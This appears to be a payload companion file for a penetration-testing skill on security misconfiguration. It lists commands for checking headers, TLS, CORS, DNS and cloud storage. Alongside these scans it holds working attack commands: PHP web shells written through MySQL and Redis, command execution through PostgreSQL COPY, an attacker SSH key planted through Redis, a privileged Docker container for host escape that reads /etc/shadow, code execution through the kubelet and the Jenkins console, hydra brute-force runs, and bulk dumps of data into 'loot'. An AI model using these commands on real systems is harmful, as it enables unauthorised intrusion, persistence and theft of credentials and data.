# Payloads: Security Misconfiguration Detection

> This file is a companion to `SKILL.md`, containing all attack payloads and testing commands organized by category.

---

## 1. HTTP Header Security Testing

### Basic Header Retrieval and Analysis

```bash
# Get response headers (first 30 lines)
curl -sI http://target | head -30

# Use testssl.sh to check TLS-related headers
testssl.sh --headers --quiet target:443

# Check full response headers (including status line)
curl -sv http://target 2>&1 | grep -i "< "
```

### Key Security Header Checklist

```
[Required] Strict-Transport-Security       -- Enforce HTTPS connections
[Required] X-Content-Type-Options: nosniff -- Prevent MIME sniffing
[Required] X-Frame-Options: DENY|SAMEORIGIN -- Prevent clickjacking
[Recommended] Content-Security-Policy      -- Restrict resource loading sources
[Recommended] Referrer-Policy              -- Control Referer leakage
[Recommended] Permissions-Policy           -- Restrict browser features
[Note] Server should hide version number
[Note] X-Powered-By should be completely removed
```

### Server Version Information Detection

```bash
# Extract Server header
curl -sI http://target | grep -i "^server:"

# Extract X-Powered-By header
curl -sI http://target | grep -i "^x-powered-by:"

# Use WhatWeb to identify technology stack and versions
whatweb -v http://target
```

---

## 2. TLS/SSL Configuration Testing

### testssl.sh Comprehensive Detection

```bash
# Full TLS/SSL configuration detection
testssl.sh --full --quiet target:443

# Check protocol versions only
testssl.sh --protocols --quiet target:443

# Check cipher suites only
testssl.sh --ciphers --quiet target:443

# Check certificate information only
testssl.sh --cert --quiet target:443

# Detect Heartbleed and other known vulnerabilities
testssl.sh --vulnerabilities --quiet target:443
```

### OpenSSL Manual Detection

```bash
# Detect supported TLS protocol versions
openssl s_client -connect target:443 -tls1   2>/dev/null | grep "Protocol"
openssl s_client -connect target:443 -tls1_1 2>/dev/null | grep "Protocol"
openssl s_client -connect target:443 -tls1_2 2>/dev/null | grep "Protocol"
openssl s_client -connect target:443 -tls1_3 2>/dev/null | grep "Protocol"

# Detect certificate details
openssl s_client -connect target:443 -servername target 2>/dev/null | openssl x509 -noout -text

# Check certificate validity period
echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -dates
```

---

## 3. Default Credential Testing

### Hydra HTTP Form Brute Force

```bash
# HTTP POST form login brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Use proxy
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect" \
  -o hydra_results.txt
```

### Database Service Default Credentials

```bash
# MySQL default credential test
hydra -l root -P /usr/share/wordlists/rockyou.txt target mysql

# PostgreSQL default credential test
hydra -l postgres -P /usr/share/wordlists/rockyou.txt target postgresql

# SSH default credential test
hydra -l root -P /usr/share/wordlists/rockyou.txt target ssh
```

### Common Default Credential Dictionary

```
admin:admin          admin:password       admin:123456
root:root            root:toor            root:password
test:test            guest:guest          user:user
postgres:postgres    mysql:mysql          sa:sa
administrator:password  admin:admin123   operator:operator
```

---

## 4. Directory Listing and Information Disclosure

### Directory Listing Detection

```bash
# Detect directory listing functionality
curl -s http://target/backup/ | grep -i "index of\|parent directory\|directory listing"

# Common enumerable directories
curl -s http://target/uploads/
curl -s http://target/files/
curl -s http://target/docs/
curl -s http://target/static/
```

### Version Control File Disclosure

```bash
# Git repository disclosure
curl -s http://target/.git/HEAD
curl -s http://target/.git/config
curl -s http://target/.git/index

# SVN repository disclosure
curl -s http://target/.svn/entries
curl -s http://target/.svn/wc.db
```

### Environment Configuration File Disclosure

```bash
# Environment variable files
curl -s http://target/.env
curl -s http://target/.env.bak
curl -s http://target/.env.local
curl -s http://target/.env.production

# Configuration files
curl -s http://target/config.php
curl -s http://target/config.yml
curl -s http://target/config.json
curl -s http://target/web.config
curl -s http://target/app.config
curl -s http://target/application.properties
```

### Gobuster Directory Brute Force Discovery

```bash
# Comprehensive directory and file discovery
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt \
  -x .bak,.old,.zip,.tar.gz,.conf,.env,.sql,.log -t 50

# Target backup file extensions
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt \
  -x .bak,.backup,.old,.orig,.save,.swp,.tmp -t 50
```

### High-Risk Path List

```
/.git/           /.svn/          /.env            /backup/
/admin/          /phpmyadmin/    /actuator/       /wp-admin/
/server-status/  /server-info/   /.htaccess       /.DS_Store
/robots.txt      /sitemap.xml    /crossdomain.xml /.well-known/
/debug/          /trace/         /console/        /elmah.axd
```

---

## 5. Error Page Information Leakage

### Trigger Detailed Error Responses

```bash
# Send malformed parameters (array injection)
curl -s http://target/page?id[]=xxx

# Access non-existent path
curl -s http://target/nonexistent_page_12345

# Send oversized parameters
curl -s "http://target/search?q=$(python3 -c 'print("A"*10000)')"

# Send invalid HTTP method
curl -s -X DEBUG http://target/

# Send malformed JSON
curl -s -X POST http://target/api/data \
  -H "Content-Type: application/json" -d '{malformed'

# Send special characters
curl -s "http://target/page?id=1'"
curl -s "http://target/page?id=1<>"
```

### Error Response Analysis Focus Areas

```
- File absolute paths (/var/www/html/...)
- Database type and version (MySQL 5.7, PostgreSQL 12.x)
- Framework version (Django 3.2, Spring Boot 2.5)
- Raw SQL statements
- Full stack traces
- Server internal IP addresses
- Third-party library version information
- Debug ports and interface addresses
```

---

## 6. CORS Misconfiguration

### CORS Configuration Detection

```bash
# Test if arbitrary Origin is accepted
curl -sI -H "Origin: http://evil.com" http://target/api/data

# Test subdomain Origin
curl -sI -H "Origin: http://sub.target.com" http://target/api/data

# Test null Origin
curl -sI -H "Origin: null" http://target/api/data

# Detect ACAO and ACAC headers
curl -sI -H "Origin: http://evil.com" http://target/api/data \
  | grep -i "access-control-allow"
```

### CORS Exploitation Notes

```bash
# Detect if Origin is reflected (most dangerous misconfiguration)
# If the response contains Access-Control-Allow-Origin: http://evil.com
# and Access-Control-Allow-Credentials: true
# then a severe CORS misconfiguration exists
```

---

## 7. Cookie Security Attributes

### Cookie Attribute Detection

```bash
# Get all Set-Cookie headers
curl -sv http://target 2>&1 | grep -i "set-cookie"

# Check specific cookie attributes
curl -sv http://target 2>&1 | grep -i "set-cookie" | \
  grep -iE "secure|httponly|samesite"
```

### Cookie Security Attribute Checklist

```
[Required] Secure      -- Transmit only over HTTPS
[Required] HttpOnly    -- Prevent JavaScript access
[Recommended] SameSite -- Prevent CSRF (Strict or Lax)
[Note] Domain          -- Should not be set too broadly
[Note] Path            -- Should be restricted to minimum path
[Note] Expires         -- Sensitive sessions should use short expiration
```

---

## 8. Unnecessary Services and Ports

### Nmap Service Enumeration

```bash
# Full port scan with service version detection
nmap -sV -sC --script=default,vuln target

# Quick common ports scan
nmap -sV -F target

# Full port scan (discover hidden services)
nmap -p- -sV --version-intensity 5 target

# UDP port scan
nmap -sU -sV --top-ports 100 target
```

### Common Unnecessary Service Detection

```bash
# Detect management interfaces
nmap -p 8080,8443,9090,10000,4848,9999 target

# Detect database ports
nmap -p 3306,5432,1433,27017,6379 target

# Detect debug ports
nmap -p 8000,8888,9000,3000,5000,9222 target

# Detect file sharing services
nmap -p 21,445,2049 target
```

### Nikto Automated Scanning

```bash
# Basic scan -- detect default files, dangerous configurations, outdated components
nikto -h http://target -o nikto_report.html -Format htm

# Target specific check categories
nikto -h http://target -Tuning 1    # Check file disclosure only
nikto -h http://target -Tuning 2    # Check default credentials only
nikto -h http://target -Tuning 6    # Check Denial of Service only

# Use proxy to bypass WAF
nikto -h http://target -useproxy http://127.0.0.1:8080
```

---

## 9. HTTP Security Header Analysis

### Missing Security Headers Detection

```bash
# Comprehensive header audit with shcheck
python3 shcheck.py https://target.com

# Check for missing HSTS header
curl -sI https://target.com | grep -i "strict-transport-security" || echo "MISSING: HSTS header"

# Check for missing X-Content-Type-Options
curl -sI https://target.com | grep -i "x-content-type-options" || echo "MISSING: X-Content-Type-Options"

# Check for missing X-Frame-Options
curl -sI https://target.com | grep -i "x-frame-options" || echo "MISSING: X-Frame-Options"

# Batch check multiple headers
for header in "strict-transport-security" "x-content-type-options" "x-frame-options" "content-security-policy" "referrer-policy" "permissions-policy"; do
  result=$(curl -sI https://target.com | grep -i "$header")
  [ -z "$result" ] && echo "MISSING: $header" || echo "FOUND: $result"
done
```

### Weak Content-Security-Policy Analysis

```bash
# Extract and analyze CSP header
curl -sI https://target.com | grep -i "content-security-policy"

# Check for unsafe-inline in CSP (XSS risk)
curl -sI https://target.com | grep -i "content-security-policy" | grep -i "unsafe-inline" && echo "WEAK: unsafe-inline allows inline scripts"

# Check for unsafe-eval in CSP (code injection risk)
curl -sI https://target.com | grep -i "content-security-policy" | grep -i "unsafe-eval" && echo "WEAK: unsafe-eval allows eval()"

# Check for wildcard sources in CSP
curl -sI https://target.com | grep -i "content-security-policy" | grep -E "\*\." && echo "WEAK: wildcard source detected"

# Check for data: URI scheme in CSP (bypass vector)
curl -sI https://target.com | grep -i "content-security-policy" | grep "data:" && echo "WEAK: data: URI scheme allows inline data"
```

### CORS Misconfiguration Deep Testing

```bash
# Test reflected Origin (most dangerous)
curl -sI -H "Origin: https://evil.attacker.com" https://target.com/api/ | grep -i "access-control"

# Test with credentials flag
curl -sI -H "Origin: https://evil.com" https://target.com/api/ | grep -i "access-control-allow-credentials"

# Test prefix matching bypass (target.com.evil.com)
curl -sI -H "Origin: https://target.com.evil.com" https://target.com/api/ | grep -i "access-control"

# Test suffix matching bypass (eviltarget.com)
curl -sI -H "Origin: https://eviltarget.com" https://target.com/api/ | grep -i "access-control"

# Test null origin (sandboxed iframe bypass)
curl -sI -H "Origin: null" https://target.com/api/ | grep -i "access-control"

# Test with HTTP scheme against HTTPS endpoint
curl -sI -H "Origin: http://target.com" https://target.com/api/ | grep -i "access-control"
```

### Referrer-Policy and Permissions-Policy

```bash
# Check Referrer-Policy header
curl -sI https://target.com | grep -i "referrer-policy" || echo "MISSING: Referrer-Policy (defaults to no-referrer-when-downgrade)"

# Check Permissions-Policy (formerly Feature-Policy)
curl -sI https://target.com | grep -i "permissions-policy" || echo "MISSING: Permissions-Policy"

# Check for overly permissive Permissions-Policy
curl -sI https://target.com | grep -i "permissions-policy" | grep -E "\*" && echo "WEAK: wildcard in Permissions-Policy"

# Verify camera/microphone/geolocation restrictions
curl -sI https://target.com | grep -i "permissions-policy" | grep -iE "camera|microphone|geolocation"
```

---

## 10. Database Misconfiguration

### Default Port and Anonymous Access Testing

```bash
# MySQL anonymous/root access test
mysql -h target -u root --password="" -e "SELECT version();" 2>/dev/null && echo "VULN: MySQL root with empty password"

# PostgreSQL trust authentication test
psql -h target -U postgres -c "SELECT version();" 2>/dev/null && echo "VULN: PostgreSQL trust auth enabled"

# MongoDB no-auth access test
mongosh --host target --eval "db.adminCommand('listDatabases')" 2>/dev/null && echo "VULN: MongoDB no authentication"

# Redis unauthenticated access test
redis-cli -h target INFO server 2>/dev/null && echo "VULN: Redis no authentication"

# CouchDB anonymous access
curl -s http://target:5984/_all_dbs && echo "VULN: CouchDB anonymous access"
```

### Database Version and Configuration Disclosure

```bash
# MySQL version and variable disclosure
mysql -h target -u root -e "SHOW VARIABLES LIKE '%version%'; SHOW VARIABLES LIKE 'secure_file_priv';"

# PostgreSQL configuration disclosure
psql -h target -U postgres -c "SHOW all;" | grep -iE "auth|ssl|password|log"

# MSSQL version detection via nmap
nmap -sV -p 1433 --script ms-sql-info target

# Oracle TNS listener version
nmap -sV -p 1521 --script oracle-tns-version target

# Cassandra default credentials (cassandra/cassandra)
cqlsh target -u cassandra -p cassandra -e "DESCRIBE KEYSPACES;"
```

### Weak Database Authentication

```bash
# MySQL brute force with common credentials
hydra -l root -P /usr/share/wordlists/mysql_default_pass.txt target mysql

# PostgreSQL brute force
hydra -l postgres -P /usr/share/wordlists/rockyou.txt target postgresql -t 4

# MSSQL sa account brute force
hydra -l sa -P /usr/share/wordlists/rockyou.txt target mssql

# MongoDB brute force
nmap -p 27017 --script mongodb-brute target

# Redis AUTH brute force
hydra -P /usr/share/wordlists/rockyou.txt target redis
```

### Database Remote Code Execution via Misconfiguration

```bash
# MySQL INTO OUTFILE (requires FILE privilege and secure_file_priv='')
mysql -h target -u root -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"

# PostgreSQL COPY command for file read
psql -h target -U postgres -c "COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned';"

# Redis RCE via config set
redis-cli -h target CONFIG SET dir /var/www/html
redis-cli -h target CONFIG SET dbfilename shell.php
redis-cli -h target SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h target SAVE
```

---

## 11. Cloud Storage Exposure

### AWS S3 Bucket Enumeration

```bash
# Check if bucket exists and is publicly accessible
aws s3 ls s3://target-bucket --no-sign-request 2>/dev/null && echo "PUBLIC: Bucket listing enabled"

# Download all public objects
aws s3 sync s3://target-bucket ./loot --no-sign-request

# Check bucket ACL
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request

# Enumerate bucket names using common patterns
for prefix in backup dev staging prod data assets; do
  aws s3 ls s3://${prefix}-target --no-sign-request 2>/dev/null && echo "FOUND: ${prefix}-target"
done
```

### Azure Blob Storage Enumeration

```bash
# Check for public blob containers
curl -s "https://targetaccount.blob.core.windows.net/\$root?restype=container&comp=list"

# Enumerate common container names
for container in backup data files images uploads assets public; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://targetaccount.blob.core.windows.net/${container}?restype=container&comp=list")
  [ "$status" = "200" ] && echo "PUBLIC: $container"
done

# Download blob listing
curl -s "https://targetaccount.blob.core.windows.net/public?restype=container&comp=list" | xmllint --format -
```

### GCP Cloud Storage Enumeration

```bash
# Check for public GCS bucket
curl -s "https://storage.googleapis.com/target-bucket/"

# List objects in public bucket
curl -s "https://storage.googleapis.com/storage/v1/b/target-bucket/o" | python3 -m json.tool

# gsutil anonymous access
gsutil ls gs://target-bucket/ 2>/dev/null && echo "PUBLIC: GCS bucket accessible"

# Check bucket IAM policy
gsutil iam get gs://target-bucket/ 2>/dev/null
```

### CDN and Storage Bypass Techniques

```bash
# Direct S3 endpoint access (bypass CDN restrictions)
curl -s "https://target-bucket.s3.amazonaws.com/"
curl -s "https://s3.amazonaws.com/target-bucket/"
curl -s "https://s3.us-east-1.amazonaws.com/target-bucket/"

# CloudFront origin bypass via S3 direct
# If CDN restricts access but S3 bucket is public
curl -s "https://target-bucket.s3.amazonaws.com/sensitive-file.txt"

# Azure CDN origin bypass
curl -s "https://targetaccount.blob.core.windows.net/container/file.txt"
```

---

## 12. Service Misconfiguration

### Redis Unauthenticated Access Exploitation

```bash
# Check Redis info without auth
redis-cli -h target INFO

# Enumerate all keys
redis-cli -h target KEYS "*"

# Dump key values
redis-cli -h target GET session:admin

# Write SSH key for persistence
redis-cli -h target CONFIG SET dir /root/.ssh
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SET sshkey "\n\nssh-rsa AAAA...attacker@kali\n\n"
redis-cli -h target SAVE
```

### Elasticsearch Open Access

```bash
# Check cluster health (no auth)
curl -s http://target:9200/_cluster/health | python3 -m json.tool

# List all indices
curl -s http://target:9200/_cat/indices?v

# Dump index data
curl -s http://target:9200/users/_search?size=1000 | python3 -m json.tool

# Search for sensitive data across all indices
curl -s http://target:9200/_all/_search?q=password | python3 -m json.tool

# Check for Kibana dashboard (default port 5601)
curl -s http://target:5601/api/status | python3 -m json.tool
```

### MongoDB Exposed Without Authentication

```bash
# Connect without credentials
mongosh --host target --eval "db.adminCommand('listDatabases')"

# Enumerate collections
mongosh --host target --eval "db.getCollectionNames()" targetdb

# Dump sensitive collections
mongosh --host target --eval "db.users.find().limit(100).toArray()" targetdb

# Check for admin access
mongosh --host target --eval "db.adminCommand({getCmdLineOpts: 1})"

# Export entire database
mongodump --host target --out ./mongo_dump/
```

### Memcached and Other Service Exposure

```bash
# Memcached stats (default port 11211)
echo "stats" | nc target 11211
echo "stats items" | nc target 11211

# Dump memcached keys
echo "stats cachedump 1 100" | nc target 11211

# Docker API exposed (port 2375/2376)
curl -s http://target:2375/version | python3 -m json.tool
curl -s http://target:2375/containers/json | python3 -m json.tool

# Kubernetes API exposed (port 6443/8443)
curl -sk https://target:6443/api/v1/namespaces/default/pods

# etcd exposed (port 2379)
curl -s http://target:2379/v2/keys/?recursive=true
```

---

## 13. TLS/SSL Misconfiguration

### Weak Cipher Suite Detection

```bash
# Detect NULL cipher suites
openssl s_client -connect target:443 -cipher NULL 2>&1 | grep "Cipher is"

# Detect EXPORT cipher suites (40-bit)
openssl s_client -connect target:443 -cipher EXPORT 2>&1 | grep "Cipher is"

# Detect RC4 cipher suites
openssl s_client -connect target:443 -cipher RC4 2>&1 | grep "Cipher is"

# Detect DES/3DES cipher suites
openssl s_client -connect target:443 -cipher DES:3DES 2>&1 | grep "Cipher is"

# Comprehensive weak cipher scan with nmap
nmap --script ssl-enum-ciphers -p 443 target | grep -E "NULL|EXPORT|RC4|DES|MD5"
```

### Certificate Validation Issues

```bash
# Check certificate expiration
echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -dates -checkend 0
# Returns 1 if expired

# Check for self-signed certificate
echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -issuer -subject | sort -u | wc -l
# If issuer == subject, it's self-signed

# Check certificate chain completeness
openssl s_client -connect target:443 -showcerts 2>/dev/null | grep -c "BEGIN CERTIFICATE"

# Check for wildcard certificate misuse
echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -text | grep "Subject:" | grep "\*"

# Check certificate revocation status via OCSP
openssl s_client -connect target:443 -status 2>/dev/null | grep -A 5 "OCSP Response"
```

### Protocol Downgrade and Mixed Content

```bash
# Test for SSLv3 support (POODLE vulnerability)
openssl s_client -connect target:443 -ssl3 2>&1 | grep -i "protocol"

# Test for TLS 1.0 support (deprecated)
openssl s_client -connect target:443 -tls1 2>&1 | grep -i "protocol"

# Check HSTS preload eligibility
curl -sI https://target.com | grep -i "strict-transport-security" | grep -i "includeSubDomains" | grep -i "preload"

# Detect HTTP to HTTPS redirect (or lack thereof)
curl -sI http://target.com | grep -i "location" | grep -i "https"

# Check for mixed content (HTTP resources on HTTPS page)
curl -s https://target.com | grep -oP 'src="http://[^"]+"|href="http://[^"]+"' | head -20
```

### SSL/TLS Vulnerability Scanning

```bash
# BEAST attack detection (CBC ciphers with TLS 1.0)
testssl.sh --beast target:443

# CRIME/BREACH compression attack detection
testssl.sh --compression target:443

# DROWN attack detection (SSLv2 cross-protocol)
testssl.sh --drown target:443

# ROBOT attack detection (RSA key exchange)
testssl.sh --robot target:443

# Lucky13 timing attack detection
testssl.sh --lucky13 target:443
```

---

## 14. Container and Orchestration Misconfiguration

### Docker Daemon Exposure

```bash
# Check for exposed Docker API (port 2375 unauthenticated)
curl -s http://target:2375/version | python3 -m json.tool

# List all containers
curl -s http://target:2375/containers/json?all=true | python3 -m json.tool

# Create privileged container for host escape
curl -s -X POST http://target:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'

# Execute command in running container
curl -s -X POST http://target:2375/containers/CONTAINER_ID/exec \
  -H "Content-Type: application/json" \
  -d '{"Cmd":["cat","/etc/shadow"],"AttachStdout":true}'
```

### Kubernetes Misconfiguration

```bash
# Check for unauthenticated API access
curl -sk https://target:6443/api/v1/namespaces/default/pods

# Check for exposed kubelet API (port 10250)
curl -sk https://target:10250/pods

# Execute command via kubelet
curl -sk https://target:10250/run/default/pod-name/container-name -d "cmd=id"

# Check for exposed etcd (port 2379)
curl -s http://target:2379/v2/keys/?recursive=true

# Check for exposed Kubernetes dashboard
curl -sk https://target:8443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
```

### Serverless and CI/CD Misconfiguration

```bash
# Check for exposed Jenkins (no auth)
curl -s http://target:8080/script -d 'script=println("id".execute().text)'

# GitLab CI runner token exposure
curl -s http://target/api/v4/runners/all?private_token=LEAKED_TOKEN

# AWS Lambda function URL without auth
curl -s https://FUNCTION_URL.lambda-url.REGION.on.aws/

# Check for exposed Grafana with default credentials
curl -s http://target:3000/api/org -u admin:admin

# Check for exposed Prometheus metrics
curl -s http://target:9090/metrics | head -50
```

---

## 15. Email and DNS Misconfiguration

### SPF/DKIM/DMARC Verification

```bash
# Check SPF record
dig +short TXT target.com | grep "v=spf1"

# Check DMARC record
dig +short TXT _dmarc.target.com

# Check DKIM record (common selectors)
for selector in default google selector1 selector2 k1; do
  dig +short TXT ${selector}._domainkey.target.com 2>/dev/null | grep -q "v=DKIM1" && echo "DKIM found: ${selector}"
done

# Verify SPF allows spoofing (permissive ~all or ?all)
dig +short TXT target.com | grep "v=spf1" | grep -E "~all|\?all" && echo "WEAK: SPF allows spoofing"

# Check for missing DMARC (allows email spoofing)
dig +short TXT _dmarc.target.com | grep -q "v=DMARC1" || echo "MISSING: No DMARC record"
```

### DNS Zone Transfer and Misconfiguration

```bash
# Attempt zone transfer
dig axfr target.com @ns1.target.com

# Check for wildcard DNS records
dig +short A *.target.com
dig +short A nonexistent-subdomain-12345.target.com

# Check for DNSSEC
dig +dnssec target.com | grep -i "rrsig"

# Enumerate subdomains via DNS
dnsrecon -d target.com -t std
fierce --domain target.com

# Check for open DNS resolver (amplification attack vector)
dig +short @target ANY google.com | wc -l
```
